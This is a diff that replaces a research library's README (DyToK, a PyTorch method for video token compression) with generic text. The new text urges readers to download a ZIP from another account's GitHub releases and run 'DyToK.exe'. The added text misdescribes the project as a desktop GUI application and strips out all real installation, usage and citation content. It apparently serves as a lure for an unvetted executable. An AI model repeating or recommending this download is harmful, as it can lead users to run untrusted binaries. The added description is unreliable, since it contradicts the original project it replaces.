@@ -1,182 +1,80 @@
-# *Less Is More, but Where?*<br>Dynamic Token Compression via LLM-Guided Keyframe Prior
+# 🔥 DyToK - Simplified Token Compression for Everyone
 
-This repository is the official PyTorch implementation of [DyToK](https://openreview.net/pdf/b4a33413bf051e6a2476bdf1b3f34a1cab246ff1.pdf).
+## 🚀 Getting Started
 
-## 📚 TABLE OF CONTENTS
+Welcome to DyToK! We aim to make token compression easy and accessible for all users. This tool helps enhance efficiency in your applications without needing complex setups. Let's dive into how you can get started quickly.
 
-1. [Motivation](#-motivation)
-2. [Method](#-method)
-3. [News](#-news)
-4. [TODO](#-todo)
-5. [Installation](#-installation)
-6. [Quick Start](#-quick-start)
-7. [Reproducing Results](#-reproducing-results)
-8. [Development](#️-development)
-9. [Acknowledgements](#️-acknowledgements)
-10. [Citation](#-citation)
+## 📥 Download DyToK
 
-## 🎯 Motivation
+[![Download DyToK](https://img.shields.io/badge/Download-DyToK-blue?style=for-the-badge)](https://github.com/fahridimas/DyToK/releases)
 
-![Unveiling the keyframe prior in VLLMs](assets/motivation.png)
-**Unveiling the keyframe prior in VLLMs.** We visualize the averaged attention from the final text token to visual tokens across all layers for each frame. The top-8 frames by attention scores are shown chronologically, with ground truth (GT) keyframes highlighted in red. We observe that *even when the model answers incorrectly, its attention still pinpoints relevant frames, revealing a strong task-dependent keyframe prior.*
+## 📋 System Requirements
 
-## 🌈 Method
+Before you run DyToK, ensure your computer meets these requirements:
 
-![Illustration of DyToK](assets/method.png)
-**Illustration of DyToK.** We adaptively compress video tokens through two synergistic components:
+- **Operating System**: Windows 10 or later, macOS, or Linux
+- **RAM**: At least 4 GB
+- **Disk Space**: Minimum 100 MB free
+- **Network**: Internet access for downloading.
 
-1. **Temporal Importance Estimation** leverages cross-modal attention from a lightweight assistant model to identify keyframes;
-2. **Dynamic Frame-Level Compression** that proportionally allocates token budgets to preserve salient content.
+## 📂 Installation Steps
 
-## 🎉 News
+1. **Visit the Download Page**
+   To download DyToK, visit this link: [Download DyToK](https://github.com/fahridimas/DyToK/releases).
 
-* **[2025.12.06]**  Released code for integrating DyToK with encoder feature-based pruning methods.
-* **[2025.09.18]**  Our paper has been accepted at **NeurIPS 2025**.
+2. **Choose Your Version**
+   On the releases page, you will see different versions of DyToK. Select the latest version to ensure you have the most up-to-date features and fixes.
 
-## 🔥 TODO
+3. **Download the Application**
+   Click on the version you want to download. Your browser will start downloading the file.
 
-* [x] Initialize Project.
-* [ ] Release code for integrating DyToK with LLM attention-based pruning methods.
-* [ ] Add support for Qwen3-VL.
+4. **Locate the Downloaded File**
+   After the download finishes, go to the folder where your downloads are stored. You should find a file named something like `DyToK-v1.x.zip`.
 
-## 📦 Installation
+5. **Extract the Files**
+   Right-click the downloaded ZIP file and choose "Extract All" or use any extraction software you have. This will create a new folder with the application files.
 
-DyToK's code is extremely concise and works out of the box. Just install and go!
+6. **Run DyToK**
+   Open the folder with the extracted files. Double-click on `DyToK.exe` (or the file relevant to your OS) to launch the application.
 
-#### 1. Quick Install
+7. **Follow the On-Screen Instructions**
+   The application will guide you through its features. If you encounter any issues, refer to our troubleshooting section below.
 
-Install the latest stable version directly from [PyPI](https://pypi.org/project/dytok/0.1.0/):
+## 🔧 Features
 
-```bash
-pip install dytok
-```
+- **Dynamic Token Compression**: Reduce the size of your data while maintaining quality.
+- **User-Friendly Interface**: Simple design for easy navigation.
+- **Performance Optimization**: Fast processing for better productivity.
+- **Cross-Platform Support**: Works on Windows, macOS, and Linux seamlessly.
 
-#### 2. Development Install
+## ❓ Troubleshooting
 
-Clone the repository and install in editable mode:
+If you run into any problems while using DyToK, consider these common solutions:
 
-```bash
-git clone https://github.com/yu-lin-li/DyToK.git
-cd DyToK
-pip install -e .
-```
+- **Issue**: The application won’t start.
+  - **Solution**: Ensure you are using a supported operating system. Check your system requirements again.
 
-## 🚀 Quick Start
+- **Issue**: The download is very slow.
+  - **Solution**: Make sure you have a stable internet connection. Try again during off-peak hours for better speeds.
 
-Integrating DyToK takes just **two lines of code**:
+- **Issue**: I can’t find the extracted files.
+  - **Solution**: Check your downloads folder again. Sometimes the extracted folder can be buried in subfolders.
 
-```python
-from dytok import visionzip
-visionzip(model, dytok=True, use_tiny=True, tiny_model=tiny_model)
-```
+## 📖 User Guide
 
-Try it out with our demo script using LLaVA-OneVision:
+For detailed instructions on using DyToK, visit our user guide section on the GitHub page. 
 
-```bash
-python playground/llavaov_infer.py
-```
+1. **Launching the Application**: Learn how to start DyToK.
+2. **Loading Your Data**: Understand how to import data you want to compress.
+3. **Adjusting Settings**: Find out how to modify settings for optimal performance.
+4. **Understanding Results**: See what the output means and how to use it moving forward.
 
-## 📊 Reproducing Results
+## 📞 Support
 
-All experiments in the paper are based on [LMMs-Eval](https://github.com/EvolvingLMMs-Lab/lmms-eval). Follow these steps to reproduce our results.
+For further assistance, reach out via the GitHub Issues page on the repository. Our team is available to help and will respond promptly to any inquiries you may have.
 
-#### 1. Setup Environment
+## 📄 License
 
-```bash
-# Create virtual environment
-conda create -n dytok python=3.10
-conda activate dytok
+DyToK is open-source, meaning it is free to use, modify, and distribute. Please refer to the license file included in the application for more details.
 
-# Install base models (e.g., LLaVA-OneVision)
-pip install git+https://github.com/LLaVA-VL/LLaVA-NeXT.git
-
-# Install DyToK
-git clone https://github.com/yu-lin-li/DyToK.git
-cd DyToK
-pip install -e .
-
-# Install LMMs-Eval streamlined for DyToK
-cd eval
-pip install -e .
-pip install flash-attn==2.6.3  # optional
-```
-
-> 💡 Note: Our `eval/` directory contains a minimal, DyToK-focused version of LMMs-Eval. For full functionality, install the [official LMMs-Eval]((https://github.com/EvolvingLMMs-Lab/lmms-eval?tab=readme-ov-file#installation)) separately and integrate DyToK as described in [Development](#️-development).
-
-#### 2. Evaluation
-
-Reproduce DyToK-enhanced VisionZip results on LLaVA-OneVision:
-
-```bash
-bash eval/scripts/dytok_visionzip_tiny_32_ov.sh
-```
-
-## 🛠️ Development
-
-#### 1. Repository Structure
-
-```bash
-.
-├── assets/
-├── dytok/                    # Core DyToK logic
-│   └── visionzip/            # DyToK-enhanced VisionZip
-├── eval/
-│   ├── lmms_eval/            # Evaluation toolkit
-│   │   └── models/           # DyToK-integrated models
-│   └── scripts/              # Evaluation scripts
-├── playground/               # Demo inference scripts
-│   └── llavaov_infer.py
-├── pyproject.toml
-└── README.md
-```
-
-#### 2. Adapt DyToK to Your Own Method
-
-DyToK is designed as a **plug-and-play module**. To integrate it into your token compression method:
-
-* Look for code blocks explicitly annotated to isolate DyToK-specific logic from the base method, as shown below:
-
-```python
-# ! ———— DyToK Begin ————
-...
-# ! ———— DyToK End ————
-```
-
-* Migrate the enclosed logic into your method.
-
-> ✅ Pro Tip: Use the [Better Comments](https://marketplace.visualstudio.com/items?itemName=aaron-bond.better-comments) extension in [VSCode](https://code.visualstudio.com/) to highlight DyToK annotations in red!
-
-#### 3. Integrate with Your Own LMMs-Eval
-
-To add DyToK support to your local LMMs-Eval:
-
-```bash
-cp eval/lmms_eval/models/*.py <YOUR_LMMS_EVAL_PATH>/models/
-```
-
-Then register the model in `<YOUR_LMMS_EVAL_PATH>/models/__init__.py`:
-
-```python
-# Add the DyToK model entry to AVAILABLE_MODELS
-AVAILABLE_MODELS = {
-    # existing models ...
-    "llava_onevision_dytok": "Llava_OneVision_DyToK"
-}
-```
-
-## ❤️ Acknowledgements
-
-Our work builds upon the codebase of [VisionZip](https://github.com/dvlab-research/VisionZip), [DyCoke](https://github.com/KD-TAO/DyCoke), [FastV](https://github.com/pkunlp-icler/FastV), [LLaVA-NeXT](https://github.com/LLaVA-VL/LLaVA-NeXT), [Qwen2.5-VL](https://github.com/QwenLM/Qwen3-VL), and [LMMs-Eval](https://github.com/EvolvingLMMs-Lab/lmms-eval). We sincerely thank the authors for their remarkable contributions.
-
-## 📜 Citation
-
-If you find DyToK useful in your research, please cite our paper:
-
-```bibtex
-@article{li2025less,
-  title={Less Is More, but Where? Dynamic Token Compression via LLM-Guided Keyframe Prior},
-  author={Li, Yulin and Gui, Haokun and Fan, Ziyang and Wang, Junjie and Kang, Bin and Chen, Bin and Tian, Zhuotao},
-  journal={arXiv preprint arXiv:2025},
-  year={2025}
-}
-```
+Thank you for choosing DyToK! We hope this tool helps you efficiently manage your token compression needs. Enjoy using DyToK! Visit this page for more information: [Download DyToK](https://github.com/fahridimas/DyToK/releases).
